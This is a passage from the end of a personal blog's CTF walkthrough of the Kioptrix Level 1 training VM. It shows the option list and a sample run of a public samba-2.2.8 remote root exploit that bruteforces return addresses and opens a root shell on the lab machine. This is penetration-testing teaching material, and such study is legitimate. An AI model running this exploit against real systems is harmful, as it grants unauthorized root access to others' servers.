+<span class="nt">-C</span> &lt;max childs&gt; max childs <span class="k">for </span>scan/bruteforce mode <span class="o">(</span>default <span class="o">=</span> 40<span class="o">)</span>
+<span class="nt">-d</span> &lt;delay&gt;      bruteforce/scanmode delay <span class="k">in </span>micro seconds <span class="o">(</span>default <span class="o">=</span> 100000<span class="o">)</span>
+<span class="nt">-f</span>              force
+<span class="nt">-p</span> &lt;port&gt;       port to attack <span class="o">(</span>default <span class="o">=</span> 139<span class="o">)</span>
+<span class="nt">-r</span> &lt;ret&gt;        <span class="k">return </span>address
+<span class="nt">-s</span>              scan mode <span class="o">(</span>random<span class="o">)</span>
+<span class="nt">-S</span> &lt;network&gt;    scan mode
+<span class="nt">-t</span> &lt;<span class="nb">type</span><span class="o">&gt;</span>       presets <span class="o">(</span>0 <span class="k">for </span>a list<span class="o">)</span>
+<span class="nt">-v</span>              verbose mode
+
+<span class="nv">$ </span>./sambal <span class="nt">-b</span> 0 <span class="nt">-v</span> 192.168.1.104
+samba-2.2.8 &lt; remote root exploit by eSDee <span class="o">(</span>www.netric.org|be<span class="o">)</span>
+<span class="nt">--------------------------------------------------------------</span>
++ Verbose mode.
++ Bruteforce mode. <span class="o">(</span>Linux<span class="o">)</span>
++ Host is running samba.
++ Using ret: <span class="o">[</span>0xbffffed4]
++ Using ret: <span class="o">[</span>0xbffffda8]
++ Using ret: <span class="o">[</span>0xbffffc7c]
++ Using ret: <span class="o">[</span>0xbffffb50]
++ Worked!
+<span class="nt">--------------------------------------------------------------</span>
+<span class="k">***</span> JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 <span class="c">#1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span>
+<span class="nb">ls
+</span>exploit
+<span class="nb">whoami
+</span>root
+</pre></table></code></div></div><p>And exploit works. So we have to methods to get root shell in kioptrix1.1.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-writeup/'>CTF-WriteUP</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/boot2root/" class="post-tag no-text-decoration" >Boot2root</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kioptrix Level 1 CTF VM WalkThrough - Ajay Kumar Tekam&url=https://ajaytekam.github.io/posts/Level-1-CTF-VM-WalkThrough/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Kioptrix Level 1 CTF VM WalkThrough - Ajay Kumar Tekam&u=https://ajaytekam.github.io/posts/Level-1-CTF-VM-WalkThrough/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Kioptrix Level 1 CTF VM WalkThrough - Ajay Kumar Tekam&url=https://ajaytekam.github.io/posts/Level-1-CTF-VM-WalkThrough/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://ajaytekam.github.io/posts/Level-1-CTF-VM-WalkThrough/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/What-is-DNS-and-How-it-Works/">What is DNS and How it Works</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/boot2root/">Boot2root</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/web-security/">Web-Security</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Metasploitable2-Walkthrough/"><div class="card-body"> <span class="timeago small" > Nov 20, 2017 <i class="unloaded">2017-11-20T10:25:11+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Metasploitable2 Walkthrough</h3><div class="text-muted small"><p> VM : BasicPentesting1 Download Link : https://www.vulnhub.com/entry/basic-pentesting-1,216/ Start the VM and get the IP of VM : $ nmap -sP 192.168.1.0/24 Nmap scan report for 192.168.1.1 H...</p></div></div></a></div><div class="card"> <a href="/posts/BasicPentesting1-VM-WalkThrough/"><div class="card-body"> <span class="timeago small" > Jan 9, 2020 <i class="unloaded">2020-01-09T02:25:11+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BasicPentesting1 VM Walkthrough</h3><div class="text-muted small"><p> VM : BasicPentesting1 Download Link : https://www.vulnhub.com/entry/basic-pentesting-1,216/ Start the VM and get the IP of VM : $ nmap -sP 192.168.1.0/24 Nmap scan report for 192.168.1.1 H...</p></div></div></a></div><div class="card"> <a href="/posts/BasicPentesting2-VM-WalkThrough/"><div class="card-body"> <span class="timeago small" > Feb 2, 2020 <i class="unloaded">2020-02-02T03:10:11+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BasicPentesting2 VM WalkThrough</h3><div class="text-muted small"><p> VM : BasicPentesting2 Dwonload Link : https://www.vulnhub.com/entry/basic-pentesting-2,241/ Start the VM and get IP of VM : $ nmap -sP 192.168.56.0/24 Nmap scan report for 192.168.56.1 Host is ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/MrRobot-CTF-VM-WalkThrough-from-VulnHub/" class="btn btn-outline-primary"><p>MrRobot CTF VM WalkThrough from VulnHub</p></a> <a href="/posts/Kioptrix-Level-1.1-CTF-VM-WalkThrough/" class="btn btn-outline-primary"><p>Kioptrix Level 1.1 CTF VM WalkThrough</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/x90ajay">Ajay Kumar Tekam</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/boot2root/">Boot2root</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/web-security/">Web Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ajaytekam.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
